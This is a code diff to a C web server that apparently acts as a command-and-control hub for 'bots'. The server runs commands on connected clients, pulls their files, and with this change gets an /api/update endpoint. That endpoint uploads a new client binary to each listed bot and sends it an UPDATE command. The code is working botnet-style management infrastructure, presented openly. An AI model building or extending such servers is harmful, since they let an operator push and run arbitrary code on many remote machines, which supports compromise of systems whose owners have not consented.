@@ -5,6 +5,7 @@
 #include <arpa/inet.h>
 #include <unistd.h>
 #include <stdbool.h>
+#include <errno.h>
 #include "../lib/cJSON.h"
 #include "../lib/mongoose.h"
 #include "../include/server/hash_table.h"
@@ -513,6 +514,8 @@ void handle_request(struct mg_connection *c, int ev, void *ev_data) {
             handle_get_bot_file(c, hm);
         } else if (strncmp(hm->uri.buf, "/api/cwd", hm->uri.len) == 0) {
             handle_get_cwd(c, hm);
+        } else if (strncmp(hm->uri.buf, "/api/update", hm->uri.len) == 0) {
+            handle_update_bots(c, hm);
         } else if (strncmp(hm->uri.buf, "/static/", 8) == 0) {
             serve_static_file(c, hm);
         } else {
@@ -625,4 +628,75 @@ cJSON *execute_command_and_fetch_result(Client *client, const char *cmd_id, cons
     free_command(&cmd);
 
     return result_json;
+}
+
+void handle_update_bots(struct mg_connection *c, struct mg_http_message *hm) {
+    char bot_ids[1024] = {0};
+
+    // Parse bot_ids from POST request (comma-separated)
+    mg_http_get_var(&hm->body, "bot_ids", bot_ids, sizeof(bot_ids));
+
+    if (strlen(bot_ids) == 0) {
+        output_log("Update request with no bots provided.\n", LOG_ERROR, LOG_TO_ALL);
+        mg_http_reply(c, 400, "Content-Type: application/json\r\n", "{\"error\":\"Bot IDs are required\"}");
+        return;
+    }
+
+    // Step 2: Loop over each bot ID and perform update
+    size_t updated = 0;
+    cJSON *results_array = cJSON_CreateArray();
+
+    char *bot_id = strtok(bot_ids, ",");
+    while (bot_id != NULL) {
+        // Trim whitespace
+        while (*bot_id == ' ' || *bot_id == '\t') bot_id++;
+
+        Client *client = find_client(&hash_table, bot_id);
+        cJSON *result = cJSON_CreateObject();
+        cJSON_AddStringToObject(result, "bot_id", bot_id);
+
+        if (client && client->state == LISTENING && client->socket > 0) {
+            // Upload the new client binary
+            if (send_file(client->socket, "client")) {
+                // Send the UPDATE command
+                Command cmd = {
+                    .cmd_id = "UPDATE",
+                    .order_type = UPDATE,
+                    .delay = 0,
+                    .program = strdup("UPDATE"),
+                    .expected_exit_code = 0,
+                    .params = malloc(2 * sizeof(char *))
+                };
+                cmd.params[0] = strdup(""); // No params needed for UPDATE
+                cmd.params[1] = NULL;
+
+                if (send_command(client->socket, &cmd) == 0) {
+                    cJSON_AddStringToObject(result, "status", "success");
+                    updated++;
+                } else {
+                    cJSON_AddStringToObject(result, "status", "failed to send update command");
+                }
+                free_command(&cmd);
+            } else {
+                cJSON_AddStringToObject(result, "status", "failed to upload client");
+            }
+        } else {
+            cJSON_AddStringToObject(result, "status", "client not found or not listening");
+        }
+
+        cJSON_AddItemToArray(results_array, result);
+        bot_id = strtok(NULL, ",");
+    }
+
+    // Step 3: Respond with results
+    cJSON *response_json = cJSON_CreateObject();
+    cJSON_AddStringToObject(response_json, "status", "done");
+    cJSON_AddNumberToObject(response_json, "updated", updated);
+    cJSON_AddItemToObject(response_json, "results", results_array);
+
+    char *response_str = cJSON_PrintUnformatted(response_json);
+    mg_http_reply(c, 200, "Content-Type: application/json\r\n", "%s", response_str);
+    output_log("Successfully sent update request to clients.\n", LOG_INFO, LOG_TO_ALL);
+    cJSON_Delete(response_json);
+    free(response_str);
 }
